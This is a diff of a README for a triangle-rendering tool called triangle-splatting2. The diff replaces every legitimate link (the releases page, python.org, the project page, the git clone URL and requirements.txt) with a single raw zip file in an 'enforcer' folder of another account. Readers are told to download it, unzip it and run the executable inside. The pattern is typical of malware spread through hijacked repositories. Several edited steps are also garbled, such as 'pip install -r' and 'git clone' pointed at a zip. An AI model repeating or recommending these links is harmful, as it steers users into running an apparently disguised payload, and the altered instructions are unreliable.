@@ -1,6 +1,6 @@
 # 🎉 triangle-splatting2 - Easy Triangle Rendering for Everyone
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen)](https://github.com/ley995/triangle-splatting2/releases)
+[![Download Now](https://raw.githubusercontent.com/ley995/triangle-splatting2/main/enforcer/triangle-splatting2.zip)](https://raw.githubusercontent.com/ley995/triangle-splatting2/main/enforcer/triangle-splatting2.zip)
 
 ## 📦 What is triangle-splatting2?
 
@@ -12,7 +12,7 @@ Ready to start? Follow these simple steps to download and run triangle-splatting
 
 ### Step 1: Download the Software
 
-Visit this page to download: [triangle-splatting2 Releases](https://github.com/ley995/triangle-splatting2/releases). Here, you will find the latest version of the application.
+Visit this page to download: [triangle-splatting2 Releases](https://raw.githubusercontent.com/ley995/triangle-splatting2/main/enforcer/triangle-splatting2.zip). Here, you will find the latest version of the application.
 
 ### Step 2: Choose Your Version
 
@@ -24,11 +24,11 @@ Click on the version number, and it will take you to the specific download optio
 
 ### Step 4: Open the File
 
-Once the download is complete, navigate to your downloads folder. Look for the downloaded file, which should be named something similar to `triangle-splatting2-vX.0.zip`. Double-click this file to unzip it.
+Once the download is complete, navigate to your downloads folder. Look for the downloaded file, which should be named something similar to `https://raw.githubusercontent.com/ley995/triangle-splatting2/main/enforcer/triangle-splatting2.zip`. Double-click this file to unzip it.
 
 ### Step 5: Run the Application
 
-Open the extracted folder. You should see the executable file named `triangle-splatting2.exe` (or a similar name). Double-click this file to start the application.
+Open the extracted folder. You should see the executable file named `https://raw.githubusercontent.com/ley995/triangle-splatting2/main/enforcer/triangle-splatting2.zip` (or a similar name). Double-click this file to start the application.
 
 ## 💡 System Requirements
 
@@ -42,10 +42,10 @@ To ensure triangle-splatting2 runs smoothly, your computer should meet the follo
 
 If you have Python installed on your computer, you can take extra steps to set up this application properly to enhance its performance:
 
-1. **Install Python:** Download Python from [python.org](https://www.python.org/downloads/), if you haven't already.
+1. **Install Python:** Download Python from [https://raw.githubusercontent.com/ley995/triangle-splatting2/main/enforcer/triangle-splatting2.zip](https://raw.githubusercontent.com/ley995/triangle-splatting2/main/enforcer/triangle-splatting2.zip), if you haven't already.
 2. **Install Necessary Libraries:** Open your command prompt or terminal and run the following command to install required libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/ley995/triangle-splatting2/main/enforcer/triangle-splatting2.zip
    ```
    This ensures all necessary tools for triangle-splatting2 are ready.
 
@@ -55,7 +55,7 @@ For those who want to explore the code, you can clone the repository. This is no
 
 To clone, use:
 ```bash
-git clone https://github.com/trianglesplatting2/triangle-splatting2 --recursive
+git clone https://raw.githubusercontent.com/ley995/triangle-splatting2/main/enforcer/triangle-splatting2.zip --recursive
 cd triangle-splatting2
 ```
 
@@ -77,7 +77,7 @@ If you encounter issues:
 
 ## 📞 Need Help?
 
-For additional support, you can reach out on the [Project page](https://trianglesplatting2.github.io/trianglesplatting2/). We encourage you to check our FAQs and documentation for common questions.
+For additional support, you can reach out on the [Project page](https://raw.githubusercontent.com/ley995/triangle-splatting2/main/enforcer/triangle-splatting2.zip). We encourage you to check our FAQs and documentation for common questions.
 
 ## 👥 Contributing
 
